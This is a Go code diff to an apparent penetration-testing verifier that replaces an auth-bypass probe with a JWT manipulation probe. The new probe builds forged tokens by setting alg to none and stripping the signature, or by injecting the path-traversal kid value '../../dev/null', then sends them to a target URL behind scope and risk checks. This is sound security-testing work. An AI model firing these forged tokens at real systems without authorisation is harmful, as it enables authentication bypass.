@@ -10,32 +10,31 @@ import (
 	"github.com/srank/ensphere/internal/evidence"
 )
 
-// AuthConfig holds configuration for auth bypass verification.
-type AuthConfig struct {
+// JWTConfig holds configuration for JWT manipulation verification.
+type JWTConfig struct {
 	URL       string
-	Method    string // HTTP method
-	Token     string // Valid token for baseline
-	Technique string // no_token | expired_token | alg_none | method_override
+	Token     string // valid JWT
+	Technique string // alg_none | kid_injection
+	Method    string
 	ProbeConfig
 }
 
-var validAuthTechniques = map[string]bool{
-	"no_token": true, "expired_token": true,
-	"alg_none": true, "method_override": true,
+var validJWTTechniques = map[string]bool{
+	"alg_none": true, "kid_injection": true,
 }
 
-// VerifyAuth runs the auth bypass verification probe.
-func VerifyAuth(cfg AuthConfig) (*ProbeResult, error) {
+// VerifyJWT runs the JWT manipulation verification probe.
+func VerifyJWT(cfg JWTConfig) (*ProbeResult, error) {
 	if err := CheckScope(cfg.URL, cfg.InScope); err != nil {
 		return nil, err
 	}
 
-	if err := CheckMaxRisk(3, cfg.MaxRisk); err != nil {
+	if err := CheckMaxRisk(2, cfg.MaxRisk); err != nil {
 		return nil, err
 	}
 
-	if !validAuthTechniques[cfg.Technique] {
-		return nil, &ScopeError{Msg: fmt.Sprintf("unsupported technique %q — use: no_token, expired_token, alg_none, method_override", cfg.Technique)}
+	if !validJWTTechniques[cfg.Technique] {
+		return nil, &ScopeError{Msg: fmt.Sprintf("unsupported technique %q — use: alg_none, kid_injection", cfg.Technique)}
 	}
 
 	timer := NewTimer()
@@ -68,60 +67,60 @@ func VerifyAuth(cfg AuthConfig) (*ProbeResult, error) {
 		return nil, fmt.Errorf("baseline probe: %w", baselineResp.Error)
 	}
 	fmt.Fprintf(os.Stderr, "[BASELINE] status=%d len=%d\n", baselineResp.StatusCode, len(baselineResp.Body))
-	writeEvidence(ew, "auth_bypass", cfg.Technique, cfg.URL, "", baselineResp.StatusCode,
+	writeEvidence(ew, "jwt", cfg.Technique, cfg.URL, "", baselineResp.StatusCode,
 		fmt.Sprintf("%dms", baselineResp.ElapsedMs), "baseline", "valid token")
 
-	if baselineResp.StatusCode != 200 {
-		return nil, fmt.Errorf("baseline with valid token returned %d — expected 200", baselineResp.StatusCode)
+	// Build modified token based on technique
+	var modifiedToken string
+	var payloadUsed string
+	var err error
+
+	switch cfg.Technique {
+	case "alg_none":
+		modifiedToken, err = buildAlgNoneJWT(cfg.Token)
+		if err != nil {
+			return nil, fmt.Errorf("build alg:none JWT: %w", err)
+		}
+		payloadUsed = "alg:none, signature stripped"
+
+	case "kid_injection":
+		modifiedToken, err = buildKidInjectionJWT(cfg.Token)
+		if err != nil {
+			return nil, fmt.Errorf("build kid injection JWT: %w", err)
+		}
+		payloadUsed = "kid:../../dev/null"
 	}
 
-	// Build probe headers based on technique
+	// Send with modified token
 	probeHeaders := make(map[string]string)
 	for k, v := range cfg.Headers {
 		probeHeaders[k] = v
 	}
-
-	probeMethod := cfg.Method
-
-	switch cfg.Technique {
-	case "no_token":
-		// Send without Authorization header
-	case "expired_token":
-		probeHeaders["Authorization"] = "Bearer expired.invalid.token"
-	case "alg_none":
-		algNoneToken, err := buildAlgNoneJWT(cfg.Token)
-		if err != nil {
-			return nil, fmt.Errorf("build alg:none JWT: %w", err)
-		}
-		probeHeaders["Authorization"] = "Bearer " + algNoneToken
-	case "method_override":
-		probeHeaders["Authorization"] = "Bearer " + cfg.Token
-		if strings.ToUpper(cfg.Method) == "POST" {
-			probeMethod = "GET"
-			probeHeaders["X-HTTP-Method-Override"] = "POST"
-		} else {
-			probeMethod = "POST"
-			probeHeaders["X-HTTP-Method-Override"] = "GET"
-		}
-	}
+	probeHeaders["Authorization"] = "Bearer " + modifiedToken
 
 	throttle.Wait()
 	probeCount++
-	probeResp := HTTPProbe(probeMethod, cfg.URL, "", probeHeaders, cfg.TimeoutSec)
+	probeResp := HTTPProbe(cfg.Method, cfg.URL, "", probeHeaders, cfg.TimeoutSec)
 	if probeResp.Error != nil {
-		return nil, fmt.Errorf("auth probe: %w", probeResp.Error)
+		return nil, fmt.Errorf("jwt probe: %w", probeResp.Error)
 	}
 	fmt.Fprintf(os.Stderr, "[PROBE] status=%d len=%d technique=%s\n", probeResp.StatusCode, len(probeResp.Body), cfg.Technique)
-	writeEvidence(ew, "auth_bypass", cfg.Technique, cfg.URL, "", probeResp.StatusCode,
+	writeEvidence(ew, "jwt", cfg.Technique, cfg.URL, "", probeResp.StatusCode,
 		fmt.Sprintf("%dms", probeResp.ElapsedMs), "probe", fmt.Sprintf("technique=%s", cfg.Technique))
 
-	baselineRound := RoundResult{
+	// Redact modified token for output (show first 20 chars)
+	redactedToken := modifiedToken
+	if len(redactedToken) > 20 {
+		redactedToken = redactedToken[:20] + "...[REDACTED]"
+	}
+
+	baseline := RoundResult{
 		StatusCode: baselineResp.StatusCode,
 		ElapsedMs:  baselineResp.ElapsedMs,
 		BodyHash:   baselineResp.BodyHash,
 		BodyLength: len(baselineResp.Body),
 	}
-	probeRound := RoundResult{
+	probe := RoundResult{
 		StatusCode: probeResp.StatusCode,
 		ElapsedMs:  probeResp.ElapsedMs,
 		BodyHash:   probeResp.BodyHash,
@@ -130,22 +129,24 @@ func VerifyAuth(cfg AuthConfig) (*ProbeResult, error) {
 
 	return &ProbeResult{
 		SchemaVersion: 2,
-		VulnType:      "auth_bypass",
+		VulnType:      "jwt",
 		Technique:     cfg.Technique,
 		StartedAt:     timer.StartedAt(),
 		ProbeCount:    probeCount,
 		Duration:      timer.Elapsed(),
-		Measurements: AuthMeasurements{
+		Measurements: JWTMeasurements{
 			Technique:       cfg.Technique,
-			Baseline:        baselineRound,
-			Probe:           probeRound,
+			Baseline:        baseline,
+			Probe:           probe,
 			BodyLengthDelta: len(probeResp.Body) - len(baselineResp.Body),
+			ModifiedToken:   redactedToken,
+			PayloadUsed:     payloadUsed,
 		},
 	}, nil
 }
 
-// buildAlgNoneJWT takes a valid JWT and returns a modified version with alg:none.
-func buildAlgNoneJWT(token string) (string, error) {
+// buildKidInjectionJWT modifies the JWT kid header to inject a path traversal value.
+func buildKidInjectionJWT(token string) (string, error) {
 	parts := strings.SplitN(token, ".", 3)
 	if len(parts) != 3 {
 		return "", fmt.Errorf("invalid JWT: expected 3 parts, got %d", len(parts))
@@ -161,7 +162,7 @@ func buildAlgNoneJWT(token string) (string, error) {
 		return "", fmt.Errorf("parse JWT header: %w", err)
 	}
 
-	header["alg"] = "none"
+	header["kid"] = "../../dev/null"
 
 	newHeaderBytes, err := json.Marshal(header)
 	if err != nil {
@@ -169,5 +170,5 @@ func buildAlgNoneJWT(token string) (string, error) {
 	}
 
 	newHeader := base64.RawURLEncoding.EncodeToString(newHeaderBytes)
-	return newHeader + "." + parts[1] + ".", nil
+	return newHeader + "." + parts[1] + "." + parts[2], nil
 }
